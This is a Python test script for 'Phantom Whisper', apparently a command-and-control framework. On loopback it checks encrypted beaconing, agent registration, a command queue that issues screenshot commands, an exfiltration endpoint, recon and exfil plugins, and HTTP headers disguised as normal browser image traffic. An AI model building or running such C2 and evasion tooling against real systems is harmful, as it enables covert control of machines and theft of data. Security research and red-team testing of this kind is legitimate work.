#!/usr/bin/env python3
"""Phantom Whisper — self-contained verification suite.

Run from the repo root:
    python3 tests/test_phantom.py

Covers: imports, crypto roundtrip, plugin loading, HTTP mimic headers,
full C2 server boot with encrypted beacon -> agent registry -> command
queue -> exfil. No network access required (all loopback). Exits non-zero
on any failure.
"""
import importlib.util
import json
import os
import sys
import time
import urllib.request

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MAIN = os.path.join(REPO, "phantom_whisper.py")
PLUGIN_DIR = os.path.join(REPO, "plugins")

FAIL = 0
PASS = 0


def check(name, cond, detail=""):
    global FAIL, PASS
    if cond:
        PASS += 1
        print(f"  \u2713 {name}")
    else:
        FAIL += 1
        print(f"  \u2717 {name} {detail}")


def load():
    spec = importlib.util.spec_from_file_location("phantom_whisper", MAIN)
    pw = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(pw)
    return pw


print("== Phantom Whisper verification ==")
print(f"  file: {MAIN}")
pw = load()
check("module imports", pw is not None)
check("VERSION == 2.0.0", pw.VERSION == "2.0.0", f"got {getattr(pw, 'VERSION', None)}")
check("required deps present", all(pw._check_import(d) for d in pw.REQUIRED_DEPS))

print("-- crypto roundtrip --")
c = pw.Crypto()
secret = "x" * 32
data = {"agent_id": "t1", "hostname": "test", "payload": "top secret"}
enc = c.encrypt_json(data)
check("encrypt_json produces string", isinstance(enc, str) and len(enc) > 10)
dec = c.decrypt_json(enc)
check("decrypt_json roundtrip", dec == data, f"got {dec}")
raw = b"attack-plan-v3"
enc2 = c.encrypt(raw)
check("encrypt/decrypt bytes roundtrip", c.decrypt(enc2) == raw)
try:
    c.decrypt(b"garbage-not-encrypted")
    check("tamper rejection", False)
except Exception:
    check("tamper rejection", True)

print("-- plugin loader --")
plugins = pw.Plugins()
plugins.scan()
names = sorted(plugins.plugins.keys())
check("3 plugins discovered", len(plugins.plugins) == 3, f"got {names}")
check("hello_world present", "hello_world" in names)
check("recon_extra present", "recon_extra" in names)
check("exfil_plugin present", "exfil_plugin" in names)

print("-- HTTP mimic --")
h = pw.HTTPMimic()
hdrs = h._hdr()
check("random UA set", hdrs.get("User-Agent", "").startswith("Mozilla/5.0"))
check("image Accept header", "image" in hdrs.get("Accept", ""))
check("referer is legit", hdrs.get("Referer", "").startswith("https://"))

print("-- C2 server end-to-end (loopback) --")
import socket
sock = socket.socket()
sock.bind(("127.0.0.1", 0))
http_port = sock.getsockname()[1]
sock.close()
srv = pw.C2Server(host="127.0.0.1", http_port=http_port, ws_port=0)
srv.start_bg()
time.sleep(1.5)
base = f"http://127.0.0.1:{http_port}"

try:
    with urllib.request.urlopen(f"{base}/api/v1/dashboard", timeout=5) as r:
        dash = r.read().decode()
    check("dashboard serves HTML", r.status == 200 and "<html" in dash.lower())
except Exception as e:
    check("dashboard serves HTML", False, str(e))

try:
    with urllib.request.urlopen(f"{base}/api/v1/status", timeout=5) as r:
        st = json.loads(r.read())
    check("status endpoint", st.get("version") == "2.0.0", f"got {st}")
except Exception as e:
    check("status endpoint", False, str(e))

# encrypted beacon -> agent registration
body = c.encrypt_json({"agent_id": "e2e-1", "hostname": "node1", "ip": "10.1.1.5"})
req = urllib.request.Request(f"{base}/api/v1/beacon", data=body.encode(),
                             headers={"Content-Type": "application/json"})
try:
    urllib.request.urlopen(req, timeout=5)
    check("beacon accepted", True)
except Exception as e:
    check("beacon accepted", False, str(e))

time.sleep(0.3)
with urllib.request.urlopen(f"{base}/api/v1/agents", timeout=5) as r:
    agents = json.loads(r.read()).get("agents", [])
check("agent registered", any(a.get("id") == "e2e-1" for a in agents), f"got {agents}")

# command queue
cmd = urllib.request.Request(f"{base}/api/v1/command/e2e-1",
                             data=json.dumps({"action": "screenshot"}).encode(),
                             headers={"Content-Type": "application/json"})
urllib.request.urlopen(cmd, timeout=5)
check("command queued", len(srv.commands.get("e2e-1", [])) == 1)

# exfil
exf = urllib.request.Request(f"{base}/api/v1/exfil",
                             data=c.encrypt_json({"agent_id": "e2e-1", "data": "leak"}).encode(),
                             headers={"Content-Type": "application/json"})
urllib.request.urlopen(exf, timeout=5)
check("exfil received", len(srv.exfil) == 1)

print(f"\n== RESULT: {PASS} passed, {FAIL} failed ==")
sys.exit(1 if FAIL else 0)
